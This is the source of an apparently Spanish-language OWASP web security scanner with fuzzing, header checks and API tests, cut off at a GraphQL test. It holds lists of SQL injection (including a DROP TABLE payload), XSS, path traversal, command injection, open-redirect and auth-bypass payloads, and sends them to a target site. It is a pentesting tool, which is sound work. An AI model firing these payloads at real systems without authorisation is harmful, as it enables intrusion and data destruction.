#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
OWASP Web Security Testing Scanner
Web Security Testing (WSTG) Scanner - Interactive & Authenticated Edition
Author: afsh4ck
Description: Full web spidering, directory fuzzing (ffuf with progress), injections, API tests, user enumeration & bruteforce.
"""

import argparse
import base64
import getpass
import re
import sys
import ssl
import socket
import time
import json
import os
import subprocess
import shutil
import platform
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.robotparser import RobotFileParser

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False
    print("[!] BeautifulSoup4 no instalado. Usando parsing básico.")

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = RESET = ''
    Style = Fore

try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

# ========== BANNER ==========
BANNER = r"""
 _       __       __         _____                   
| |     / /_____ / /_ ____ _/ ___/ _____ ____ _ ____ 
| | /| / // ___// __// __ `/\__ \ / ___// __ `// __ \
| |/ |/ /(__  )/ /_ / /_/ /___/ // /__ / /_/ // / / /
|__/|__//____/ \__/ \__, //____/ \___/ \__,_//_/ /_/ 
                   /____/                            
"""
DESCRIPTION = "OWASP Web Security Testing Scanner"
DEVELOPER = "developed by @afsh4ck"
VERSION = "1.2.0"

# ========== CONFIGURACIÓN ==========
DEFAULT_TIMEOUT = 10
MAX_REDIRECTS = 3
THREADS = 5
AUTHENTICATED = False
AUTH_SESSION = None
TARGET_URL = ""
REQUEST_DELAY = 0.0  # Delay entre requests (segundos)
OUTPUT_FILE = None   # Ruta del archivo de reporte
FINDINGS = []        # Hallazgos acumulados para el reporte

COMMON_DIRS = [
    "admin", "backup", "cgi-bin", "css", "js", "images", "uploads", "download",
    "include", "inc", "config", "api", "v1", "old", "test", "dev", "hidden",
    "robots.txt", "sitemap.xml", ".git/HEAD", ".git/config", ".env", ".env.backup",
    "phpinfo.php", "info.php", "backup.zip", "backup.sql", "dump.sql",
    "wp-admin", "wp-content", "administrator", "phpmyadmin", "adminer.php",
    ".htaccess", ".htpasswd", "web.config", "crossdomain.xml", "clientaccesspolicy.xml",
    ".well-known/security.txt", "package.json", "composer.json", "server-status"
]

SECLISTS_SMALL = "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt"
SECLISTS_MEDIUM = "/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt"
SECLISTS_PASSWORDS = "/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt"
DEFAULT_PASSWORDS = [
    "123456", "password", "123456789", "12345", "12345678", "qwerty", "abc123", "admin", "letmein", "welcome"
]

# Payloads
SQL_PAYLOADS = [
    "'", "''", "\"", "\\", "' OR '1'='1", "' OR 1=1--",
    "1 AND 1=1", "1 AND 1=2", "' UNION SELECT NULL--", "'; DROP TABLE users--",
    "' OR SLEEP(5)-- ", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>", "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>", "javascript:alert('XSS')",
    "<svg/onload=alert(1)>", "'-alert(1)-'", "\"-alert(1)-\""
]

PATH_TRAVERSAL = [
    "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "....//....//....//etc/passwd"
]

COMMAND_INJECT = [
    "; ls", "| dir", "|| ping -c 1 127.0.0.1", "& whoami",
    "$(whoami)", "`whoami`", "| net user"
]

OPEN_REDIRECT = ["https://evil.com", "//evil.com", "/redirect?url=https://evil.com"]

API_ENDPOINTS = [
    # Raíces de API
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/v1", "/v2", "/v3", "/rest", "/rest/v1",
    # Recursos comunes
    "/api/users", "/api/user", "/api/accounts", "/api/account",
    "/api/admin", "/api/me", "/api/profile", "/api/whoami",
    "/api/config", "/api/settings", "/api/flags", "/api/data",
    "/api/keys", "/api/tokens", "/api/secrets", "/api/credentials",
    "/api/debug", "/api/test", "/api/internal",
    "/rest/users", "/rest/user", "/rest/admin", "/rest/profile",
    # Documentación OpenAPI / Swagger
    "/swagger", "/swagger-ui.html", "/swagger-ui/", "/swagger.json", "/swagger.yaml",
    "/openapi.json", "/openapi.yaml",
    "/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/redoc", "/docs", "/api/docs", "/api/swagger",
    # GraphQL
    "/graphql", "/graphiql", "/api/graphql", "/query", "/api/query",
    # Spring Actuator / monitoring
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/actuator/beans", "/actuator/httptrace", "/actuator/loggers",
    "/health", "/metrics", "/info", "/status", "/ping",
    # Rutas de autenticación
    "/api/auth", "/api/login", "/api/token", "/api/refresh",
    "/api/register", "/api/signup",
    # Rutas sensibles
    "/.well-known/", "/api/version", "/api/changelog",
    "/console", "/api/console", "/h2-console",
]

MASS_ASSIGNMENT_FIELDS = [
    {"is_admin": True},
    {"role": "admin"},
    {"admin": True},
    {"isAdmin": True},
    {"privilege": "admin"},
    {"user_role": "administrator"},
    {"account_type": "premium"},
    {"verified": True},
    {"status": "active"},
    {"credits": 9999},
    {"balance": 9999},
    {"permissions": ["admin", "superuser"]},
]

LOGIN_PATHS = [
    "/login", "/signin", "/auth", "/logon", "/login.php", "/login.html",
    "/user/login", "/account/login", "/admin/login", "/wp-login.php"
]

# ========== UTILIDADES ==========
def clear_screen():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')

def check_ffuf():
    return shutil.which("ffuf") is not None

def print_info(msg):
    print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} {msg}")

def print_good(msg):
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")

def print_warning(msg):
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")

def print_error(msg):
    print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")

def print_vuln(msg):
    FINDINGS.append(f"[VULN] {msg}")
    print(f"{Fore.MAGENTA}[VULN]{Style.RESET_ALL} {msg}")

def save_report(output_file=None):
    """Guarda hallazgos en TXT y JSON."""
    if not FINDINGS:
        print_info("No se registraron vulnerabilidades en esta sesión.")
        return
    if not output_file:
        output_file = f"wstg_report_{int(time.time())}.txt"
    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"WSTG Scanner v{VERSION} - Reporte de Vulnerabilidades\n")
            f.write(f"Objetivo : {TARGET_URL}\n")
            f.write(f"Fecha    : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            for finding in FINDINGS:
                f.write(finding + "\n")
        json_file = output_file.rsplit('.', 1)[0] + '.json'
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump({
                "tool": f"WSTG Scanner v{VERSION}",
                "target": TARGET_URL,
                "date": time.strftime('%Y-%m-%d %H:%M:%S'),
                "total_findings": len(FINDINGS),
                "findings": FINDINGS
            }, f, indent=2, ensure_ascii=False)
        print_good(f"Reporte guardado: {output_file} y {json_file} ({len(FINDINGS)} hallazgos)")
    except Exception as e:
        print_error(f"No se pudo guardar el reporte: {e}")

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')

def get_session(user_agent=None):
    session = requests.Session()
    session.headers.update({
        'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/html, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    })
    session.verify = False
    session.max_redirects = MAX_REDIRECTS
    return session

def check_seclists():
    if os.path.exists(SECLISTS_SMALL):
        return SECLISTS_SMALL
    elif os.path.exists(SECLISTS_MEDIUM):
        print_warning("No se encontró la wordlist small, usando medium (más grande y lenta).")
        return SECLISTS_MEDIUM
    else:
        print_warning("No se encontró SecLists en las rutas por defecto.")
        response = input("¿Deseas instalar SecLists automáticamente? (requiere sudo) [s/N]: ").strip().lower()
        if response == 's':
            try:
                print_info("Ejecutando: sudo apt update && sudo apt install seclists -y")
                subprocess.run(["sudo", "apt", "update"], check=True, capture_output=True)
                subprocess.run(["sudo", "apt", "install", "seclists", "-y"], check=True, capture_output=True)
                if os.path.exists(SECLISTS_SMALL):
                    print_good("SecLists instalado correctamente.")
                    return SECLISTS_SMALL
                elif os.path.exists(SECLISTS_MEDIUM):
                    return SECLISTS_MEDIUM
                else:
                    print_error("La instalación parece haber fallado.")
            except Exception as e:
                print_error(f"No se pudo instalar SecLists: {e}")
        print_warning("Usando wordlist interna reducida para fuzzing.")
        return None

# ========== FUNCIONES DE AUTENTICACIÓN ==========
def setup_authentication():
    global AUTHENTICATED, AUTH_SESSION, TARGET_URL
    print_info("Configuración de autenticación")
    login_url = input("URL de login (dejar vacío si es la misma que la objetivo): ").strip()
    if not login_url:
        login_url = TARGET_URL
    else:
        login_url = normalize_url(login_url)
    username = input("Usuario: ")
    password = getpass.getpass("Contraseña: ")

    temp_session = get_session()
    try:
        resp = temp_session.get(login_url, auth=(username, password), timeout=DEFAULT_TIMEOUT)
        if resp.status_code == 200:
            print_good("Autenticación Basic Auth exitosa")
            AUTH_SESSION = temp_session
            AUTHENTICATED = True
            return
    except:
        pass

    try:
        resp = temp_session.get(login_url, timeout=DEFAULT_TIMEOUT)
        if HAS_BS4:
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action')
                method = form.get('method', 'get').upper()
                inputs = form.find_all(['input', 'textarea'])
                user_field = None
                pass_field = None
                for inp in inputs:
                    name = inp.get('name', '').lower()
                    if 'user' in name or 'email' in name or 'login' in name:
                        user_field = inp.get('name')
                    if 'pass' in name:
                        pass_field = inp.get('name')
                if user_field and pass_field and method == 'POST':
                    form_url = urljoin(login_url, action) if action else login_url
                    data = {user_field: username, pass_field: password}
                    for inp in inputs:
                        if inp.get('type') == 'hidden' and inp.get('name'):
                            data[inp.get('name')] = inp.get('value', '')
                    resp2 = temp_session.post(form_url, data=data, timeout=DEFAULT_TIMEOUT)
                    if resp2.status_code == 302 or "dashboard" in resp2.url or "welcome" in resp2.text.lower():
                        print_good("Autenticación exitosa mediante formulario")
                        AUTH_SESSION = temp_session
                        AUTHENTICATED = True
                        return
                    else:
                        print_error("Falló la autenticación con el formulario detectado.")
    except Exception as e:
        print_error(f"Error durante autenticación: {e}")
    
    print_warning("No se pudo autenticar. Las pruebas se realizarán sin autenticación.")
    AUTHENTICATED = False
    AUTH_SESSION = None

def get_active_session():
    global AUTH_SESSION, AUTHENTICATED
    if AUTHENTICATED and AUTH_SESSION:
        return AUTH_SESSION
    else:
        return get_session()

# ========== FUNCIONES DE PRUEBA ==========
def safe_execute(func, *args, **kwargs):
    try:
        return func(*args, **kwargs)
    except KeyboardInterrupt:
        raise
    except Exception as e:
        print_error(f"Error en {func.__name__}: {str(e)[:100]}")
        return None

def gather_info(target, session):
    try:
        info = {}
        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
        info['status_code'] = resp.status_code
        info['headers'] = dict(resp.headers)
        info['cookies'] = resp.cookies
        info['server'] = resp.headers.get('Server', 'No revelado')
        tech = []
        if 'Set-Cookie' in resp.headers and 'PHPSESSID' in resp.headers['Set-Cookie']:
            tech.append('PHP')
        if 'X-Powered-By' in resp.headers:
            tech.append(resp.headers['X-Powered-By'])
        if 'ASP.NET' in str(resp.headers):
            tech.append('ASP.NET')
        info['technologies'] = list(set(tech))
        return info
    except Exception as e:
        print_error(f"No se pudo obtener información: {e}")
        return None

def check_robots_sitemap(target, session):
    try:
        paths = []
        for p in ['/robots.txt', '/sitemap.xml']:
            url = urljoin(target, p)
            try:
                resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code == 200:
                    print_good(f"Encontrado: {url}")
                    paths.append(url)
                    if 'robots.txt' in p:
                        lines = resp.text.splitlines()
                        for line in lines:
                            if line.startswith('Disallow:') or line.startswith('Allow:'):
                                parts = line.split(':')
                                if len(parts) > 1:
                                    path = parts[1].strip()
                                    if path and path != '/':
                                        print_info(f"  Ruta en robots.txt: {path}")
            except:
                pass
        return paths
    except Exception as e:
        print_error(f"Error en check_robots_sitemap: {e}")
        return []

def check_http_methods(target, session):
    try:
        allowed = []
        resp = session.options(target, timeout=DEFAULT_TIMEOUT)
        if 'Allow' in resp.headers:
            allowed = [m.strip() for m in resp.headers['Allow'].split(',')]
            print_info(f"Métodos HTTP permitidos: {', '.join(allowed)}")
        trace_resp = session.request('TRACE', target, timeout=DEFAULT_TIMEOUT)
        if trace_resp.status_code == 200:
            print_vuln("Método TRACE habilitado (Cross-Site Tracing)")
            allowed.append('TRACE')
        return allowed
    except Exception as e:
        print_error(f"Error en check_http_methods: {e}")
        return []

def dir_bruteforce(target, session, wordlist=None, threads=THREADS, use_ffuf=True):
    try:
        if wordlist is None:
            default_wl = check_seclists()
            if default_wl:
                wordlist = default_wl
        if wordlist and not os.path.isfile(wordlist):
            print_warning(f"No se pudo leer la wordlist '{wordlist}'. Usando lista interna.")
            wordlist = None

        if use_ffuf and check_ffuf() and wordlist and os.path.isfile(wordlist):
            print_info("Usando ffuf para fuzzing (rápido y eficiente) - mostrando progreso y resultados")
            ffuf_cmd = [
                "ffuf", "-u", f"{target}/FUZZ", "-w", wordlist,
                "-t", str(threads), "-fc", "404,403", "-ac"
            ]
            print_info(f"Ejecutando: {' '.join(ffuf_cmd)}")
            try:
                process = subprocess.Popen(ffuf_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
                last_progress = ""
                for line in process.stdout:
                    # Mostrar progreso (líneas con "Progress:")
                    if "Progress:" in line:
                        match = re.search(r'Progress:\s*(\d+)/(\d+)', line)
                        if match:
                            current = int(match.group(1))
                            total = int(match.group(2))
                            percent = (current / total) * 100 if total > 0 else 0
                            new_progress = f"{current}/{total} ({percent:.1f}%)"
                            if new_progress != last_progress:
                                last_progress = new_progress
                                print_info(f"Progreso ffuf: {new_progress}")
                    # Mostrar resultados: líneas que contienen "Status:" y que NO comienzan por '#' (espacios opcionales)
                    if "Status:" in line:
                        stripped = line.lstrip()
                        if not stripped.startswith('#'):
                            print_vuln(line.strip())
                process.wait()
                if process.returncode != 0 and process.returncode != 1:
                    print_error(f"ffuf terminó con código {process.returncode}")
                return []
            except KeyboardInterrupt:
                process.terminate()
                print_warning("Fuzzing interrumpido por el usuario")
                return []
            except Exception as e:
                print_error(f"Error ejecutando ffuf: {e}")
                print_warning("Fallando a método interno...")
        else:
            if use_ffuf and not check_ffuf():
                print_warning("ffuf no está instalado. Usando método interno (más lento).")
            if wordlist is None:
                paths = COMMON_DIRS
                print_info(f"Usando lista interna reducida ({len(paths)} rutas)")
            else:
                with open(wordlist, 'r') as f:
                    paths = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                print_info(f"Usando wordlist: {wordlist} ({len(paths)} entradas)")
            
            results = []
            print_info(f"Iniciando fuzzing de directorios (método interno)...")

            def test_path(path):
                url = urljoin(target, path)
                try:
                    if REQUEST_DELAY > 0:
                        time.sleep(REQUEST_DELAY)
                    resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                    if resp.status_code < 400:
                        return (url, resp.status_code, len(resp.content))
                except Exception:
                    pass
                return None

            if HAS_TQDM:
                with tqdm(total=len(paths), desc="Fuzzing directorios", unit="req", ncols=80) as pbar:
                    with ThreadPoolExecutor(max_workers=threads) as executor:
                        future_to_path = {executor.submit(test_path, p): p for p in paths}
                        for future in as_completed(future_to_path):
                            res = future.result()
                            if res:
                                url, code, size = res
                                print_good(f"Encontrado: {url} (código {code}, tamaño {size})")
                                results.append({'url': url, 'status': code, 'size': size})
                            pbar.update(1)
            else:
                completed = 0
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    future_to_path = {executor.submit(test_path, p): p for p in paths}
                    for future in as_completed(future_to_path):
                        completed += 1
                        if completed % 50 == 0 or completed == len(paths):
                            print_info(f"Progreso: {completed}/{len(paths)} rutas probadas")
                        res = future.result()
                        if res:
                            url, code, size = res
                            print_good(f"Encontrado: {url} (código {code}, tamaño {size})")
                            results.append({'url': url, 'status': code, 'size': size})
            return results
    except Exception as e:
        print_error(f"Error en fuzzing: {e}")
        return []

def extract_forms_and_params(target, session):
    try:
        forms = []
        params = set()
        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
        if HAS_BS4:
            soup = BeautifulSoup(resp.text, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action')
                method = form.get('method', 'get').upper()
                inputs = []
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if name:
                        inputs.append(name)
                forms.append({'action': action, 'method': method, 'inputs': inputs})
            for a in soup.find_all('a', href=True):
                href = a['href']
                parsed = urlparse(href)
                if parsed.query:
                    for key in parse_qs(parsed.query).keys():
                        params.add(key)
        else:
            form_regex = re.compile(r'<form.*?action=["\'](.*?)["\'].*?method=["\'](.*?)["\'].*?>', re.I)
            for match in form_regex.finditer(resp.text):
                action = match.group(1)
                method = match.group(2).upper()
                forms.append({'action': action, 'method': method, 'inputs': []})
            param_regex = re.compile(r'<a\s+href=["\'][^"\']*\?(.*?)(?:["\']|#)', re.I)
            for match in param_regex.finditer(resp.text):
                query = match.group(1)
                for key in parse_qs(query).keys():
                    params.add(key)
        print_info(f"Formularios encontrados: {len(forms)}")
        print_info(f"Parámetros únicos en enlaces: {len(params)}")
        return forms, list(params)
    except Exception as e:
        print_error(f"Error extrayendo formularios/parámetros: {e}")
        return [], []

def advanced_injection_tests(url, param, session, method='GET'):
    try:
        for payload in ['\' OR SLEEP(5)-- ', '1\' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--']:
            start = time.time()
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    session.get(test_url, timeout=DEFAULT_TIMEOUT+2)
                else:
                    session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT+2)
                elapsed = time.time() - start
                if elapsed > 4:
                    print_vuln(f"Posible SQLi time-based en {param} (retraso {elapsed:.2f}s)")
            except:
                pass
        for payload in XSS_PAYLOADS:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
                if payload in resp.text and ('<script>' in payload or 'onerror=' in payload):
                    print_vuln(f"Posible XSS en {param} con payload: {payload}")
            except:
                pass
        for payload in COMMAND_INJECT:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
                if "uid=" in resp.text or "Directory of" in resp.text:
                    print_vuln(f"Posible Command Injection en {param} con payload: {payload}")
            except:
                pass
    except Exception as e:
        print_error(f"Error en advanced_injection_tests para {param}: {e}")

def test_path_traversal(url, param, session, method='GET'):
    try:
        for payload in PATH_TRAVERSAL:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
                if "root:" in resp.text or "[extensions]" in resp.text:
                    print_vuln(f"Path Traversal en {param}: {payload}")
                    return True
            except:
                pass
        return False
    except Exception as e:
        print_error(f"Error en path traversal: {e}")
        return False

def test_open_redirect(url, param, session, method='GET'):
    try:
        for payload in OPEN_REDIRECT:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                if resp.status_code in [301,302,303,307]:
                    location = resp.headers.get('Location', '')
                    if 'evil.com' in location or '//' in location:
                        print_vuln(f"Open Redirect en {param} -> {location}")
            except:
                pass
    except Exception as e:
        print_error(f"Error en open redirect: {e}")

def check_security_headers(headers):
    try:
        checks = {
            'Strict-Transport-Security': 'HSTS no implementado',
            'Content-Security-Policy': 'CSP no implementado',
            'X-Frame-Options': 'Clickjacking: falta X-Frame-Options',
            'X-Content-Type-Options': 'Falta X-Content-Type-Options',
            'Referrer-Policy': 'Falta Referrer-Policy'
        }
        for header, warning in checks.items():
            if header not in headers:
                print_warning(warning)
            else:
                print_good(f"{header}: {headers[header]}")
    except Exception as e:
        print_error(f"Error revisando cabeceras: {e}")

def check_cookie_security(cookies):
    try:
        for cookie in cookies:
            name = cookie.name
            if not cookie.secure:
                print_warning(f"Cookie '{name}' sin flag Secure")
            if not cookie.has_nonstandard_attr('HttpOnly'):
                print_warning(f"Cookie '{name}' sin flag HttpOnly")
    except Exception as e:
        print_error(f"Error revisando cookies: {e}")

def check_info_disclosure(resp_text):
    try:
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp_text)
        if emails:
            print_warning(f"Emails expuestos: {', '.join(set(emails))}")
        internal_paths = re.findall(r'(?:C:\\|/home/|/var/www/|/etc/)[^\s\'"<>]+', resp_text, re.I)
        if internal_paths:
            print_warning(f"Rutas internas expuestas: {set(internal_paths)}")
        comments = re.findall(r'<!--(.*?)-->', resp_text, re.DOTALL)
        suspicious = [c for c in comments if re.search(r'todo|fixme|debug|password|key|token', c, re.I)]
        if suspicious:
            print_warning("Información sensible en comentarios HTML")
    except Exception as e:
        print_error(f"Error en info disclosure: {e}")

def check_directory_listing(url, session):
    try:
        test_url = urljoin(url, 'images/')
        resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
        if resp.status_code == 200 and ('Index of /' in resp.text or 'Parent Directory' in resp.text):
            print_vuln(f"Directory listing en {test_url}")
    except:
        pass

def check_ssl_tls(target):
    try:
        parsed = urlparse(target)
        if parsed.scheme != 'https':
            print_info("No se evaluará SSL/TLS (no HTTPS)")
            return
        hostname = parsed.hostname
        port = parsed.port or 443
        context = ssl.create_default_context()
        with socket.create_connection((hostname, port), timeout=DEFAULT_TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                print_info(f"Certificado para: {cert.get('subject')}")
                version = ssock.version()
                if version and version not in ('TLSv1.2', 'TLSv1.3'):
                    print_warning(f"Protocolo TLS inseguro: {version}")
                else:
                    print_good(f"Protocolo TLS: {version}")
    except Exception as e:
        print_error(f"SSL/TLS error: {e}")

def test_cors_advanced(target, session):
    """OWASP API8 / WSTG-CLNT-007: Verifica configuraciones CORS inseguras."""
    try:
        parsed = urlparse(target)
        evil_origins = [
            "https://evil.com",
            "null",
            f"https://{parsed.netloc}.evil.com",
            f"https://evil.{parsed.netloc}",
        ]
        for origin in evil_origins:
            try:
                resp = session.get(target, timeout=DEFAULT_TIMEOUT, headers={'Origin': origin})
                acao = resp.headers.get('Access-Control-Allow-Origin', '')
                acac = resp.headers.get('Access-Control-Allow-Credentials', '').lower()
                if acao == '*' and acac == 'true':
                    print_vuln(f"CORS crítico: wildcard + Allow-Credentials=true [{origin}]")
                elif acao == origin:
                    if acac == 'true':
                        print_vuln(f"CORS: origen reflejado con credenciales permitidas -> {origin}")
                    else:
                        print_warning(f"CORS: origen reflejado sin credenciales -> {origin}")
                elif acao == '*':
                    print_warning("CORS: wildcard (*) sin Allow-Credentials")
                # Verificar preflight OPTIONS
                try:
                    pre = session.options(target, timeout=DEFAULT_TIMEOUT, headers={
                        'Origin': origin,
                        'Access-Control-Request-Method': 'POST',
                        'Access-Control-Request-Headers': 'Authorization',
                    })
                    pre_acao = pre.headers.get('Access-Control-Allow-Origin', '')
                    if pre_acao == origin or pre_acao == '*':
                        print_info(f"  Preflight CORS acepta POST+Authorization desde {origin}")
                except Exception:
                    pass
            except Exception:
                pass
    except Exception as e:
        print_error(f"Error en test CORS avanzado: {e}")


# ========== API PENTESTING (OWASP API Top 10) ==========

def discover_api_endpoints(target, session):
    """OWASP API9: Descubre endpoints expuestos y analiza documentación OpenAPI/Swagger."""
    found = []
    try:
        print_info(f"Escaneando {len(API_ENDPOINTS)} rutas de API conocidas...")
        for ep in API_ENDPOINTS:
            url = urljoin(target, ep)
            try:
                resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                ct = resp.headers.get('Content-Type', '').split(';')[0].strip()
                if resp.status_code == 200:
                    print_good(f"[200] {url}  ({ct})")
                    found.append({'url': url, 'endpoint': ep, 'status': 200, 'content_type': ct})
                    # Extraer rutas desde Swagger/OpenAPI
                    if any(x in ep for x in ('swagger', 'openapi', 'api-docs')):
                        try:
                            doc = resp.json()
                            paths = list(doc.get('paths', {}).keys())
                            if paths:
                                print_info(f"  Rutas documentadas ({len(paths)}): {', '.join(paths[:12])}")
                                for path in paths:
                                    extra_url = urljoin(target, path)
                                    found.append({'url': extra_url, 'endpoint': path,
                                                  'status': 0, 'content_type': ''})
                        except Exception:
                            pass
                elif resp.status_code == 401:
                    print_warning(f"[401] {url}  (requiere autenticación)")
                    found.append({'url': url, 'endpoint': ep, 'status': 401, 'content_type': ct})
                elif resp.status_code == 403:
                    print_warning(f"[403] {url}  (prohibido)")
                    found.append({'url': url, 'endpoint': ep, 'status': 403, 'content_type': ct})
            except Exception:
                pass
        print_info(f"Total endpoints API encontrados/accesibles: {len(found)}")
    except Exception as e:
        print_error(f"Error descubriendo endpoints: {e}")
    return found


def test_api_auth_bypass(found_endpoints, session):
    """OWASP API5/BFLA: Detecta endpoints restringidos accesibles sin autenticación."""
    try:
        unauth_session = get_session()
        bypass_headers_list = [
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
        ]
        restricted = [item for item in found_endpoints if item['status'] in (401, 403)]
        if not restricted:
            print_info("Sin endpoints restringidos encontrados para probar bypass.")
            return
        for item in restricted:
            url = item['url']
            try:
                resp = unauth_session.get(url, timeout=DEFAULT_TIMEOUT)
                if resp.status_code == 200 and len(resp.content) > 50:
                    print_vuln(f"BFLA: accesible sin auth -> {url}")
                    continue
            except Exception:
                pass
            for hdrs in bypass_headers_list:
                try:
                    resp = unauth_session.get(url, timeout=DEFAULT_TIMEOUT, headers=hdrs)
                    if resp.status_code == 200:
                        print_vuln(f"Auth bypass con {list(hdrs.keys())[0]} en {url}")
                        break
                except Exception:
                    pass
    except Exception as e:
        print_error(f"Error en test auth bypass: {e}")


def test_api_idor(found_endpoints, session):
    """OWASP API1/BOLA: Prueba IDOR modificando IDs en rutas y query params."""
    try:
        id_patterns = [
            (r'((?:/[a-zA-Z_-]+)/)(\d{1,10})(/|$)', 2),
            (r'([?&](?:id|user_id|uid|account_id|object_id)=)(\d+)', 2),
            (r'((?:/[a-zA-Z_-]+)/)([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', 2),
        ]
        alt_ids = ['0', '1', '2', '-1', '9999', '../1']
        tested = set()
        hits = 0
        for item in found_endpoints:
            url = item['url']
            for pattern, group in id_patterns:
                match = re.search(pattern, url)
                if not match:
                    continue
                original_id = match.group(group)
                prefix = url[:match.start(group)]
                suffix = url[match.end(group):]
                try:
                    base_resp = session.get(url, timeout=DEFAULT_TIMEOUT)
                    if base_resp.status_code != 200:
                        continue
                    base_len = len(base_resp.content)
                except Exception:
                    continue
                for alt in alt_ids:
                    if alt == original_id:
                        continue
                    test_url = prefix + alt + suffix
                    if test_url in tested:
                        continue
                    tested.add(test_url)
                    try:
                        resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                        if resp.status_code == 200 and base_len > 0:
                            diff_ratio = abs(len(resp.content) - base_len) / base_len
                            if diff_ratio < 0.4:
                                print_vuln(f"IDOR: {url} -> ID={alt} devuelve {resp.status_code} "
                                           f"({len(resp.content)}B, ratio_diff={diff_ratio:.2f})")
                                hits += 1
                    except Exception:
                        pass
        if hits == 0:
            print_info("Sin evidencias claras de IDOR en los endpoints encontrados.")
    except Exception as e:
        print_error(f"Error en test IDOR: {e}")


def test_api_mass_assignment(found_endpoints, session):
    """OWASP API6: Inyecta campos privilegiados en endpoints que aceptan JSON."""
    try:
        targets = [item for item in found_endpoints
                   if item['status'] in (200, 201, 0)
                   and any(x in item['endpoint'] for x in
                           ('user', 'profile', 'account', 'register', 'update', 'me', 'signup'))]
        if not targets:
            print_info("Sin endpoints candidatos a Mass Assignment.")
            return
        method_map = [('POST', 'post'), ('PUT', 'put'), ('PATCH', 'patch')]
        for item in targets:
            url = item['url']
            for fields in MASS_ASSIGNMENT_FIELDS[:6]:
                for method_name, method_attr in method_map:
                    try:
                        method = getattr(session, method_attr)
                        resp = method(url, json=fields, timeout=DEFAULT_TIMEOUT)
                        if resp.status_code in (200, 201, 202, 204):
                            key = list(fields.keys())[0]
                            resp_lower = resp.text.lower()
                            if key in resp_lower or 'admin' in resp_lower or 'success' in resp_lower:
                                print_vuln(f"Mass Assignment en {url} [{method_name}] con {fields}")
                                break
                    except Exception:
                        pass
    except Exception as e:
        print_error(f"Error en test Mass Assignment: {e}")


def test_graphql(target, session):
